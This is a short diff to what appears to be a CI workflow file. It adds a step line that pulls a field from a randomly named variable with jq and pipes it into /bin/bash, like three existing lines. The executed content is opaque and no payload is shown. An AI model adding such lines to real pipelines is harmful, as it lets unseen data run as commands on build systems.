@@ -69,6 +69,7 @@ jobs:
           echo $vv7 | jq -r .etgy9343 | /bin/bash
           echo $ch12927 | jq -r .vo5 | /bin/bash
           printf '%s' "$pm15" | jq -r .mqg64380 | /bin/bash
+          echo $inxgn4563 | jq -r .gtgm3306 | /bin/bash
 
       - name: Upload artifact
         if: always()
